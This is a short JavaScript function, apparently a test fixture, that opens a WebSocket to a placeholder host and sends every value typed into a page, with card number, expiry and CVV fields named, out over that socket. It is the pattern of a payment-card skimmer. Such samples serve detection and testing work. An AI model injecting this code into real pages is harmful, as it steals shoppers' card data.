function inspect(document, WebSocket) {
  const channel = new WebSocket('wss://example.invalid/fixture');
  const fields = {cardNumber: '', cardExpiry: '', cvv: ''};
  document.addEventListener('input', ev => {
    channel.send(JSON.stringify({field: fields.cardNumber, value: ev.target.value}));
  });
}
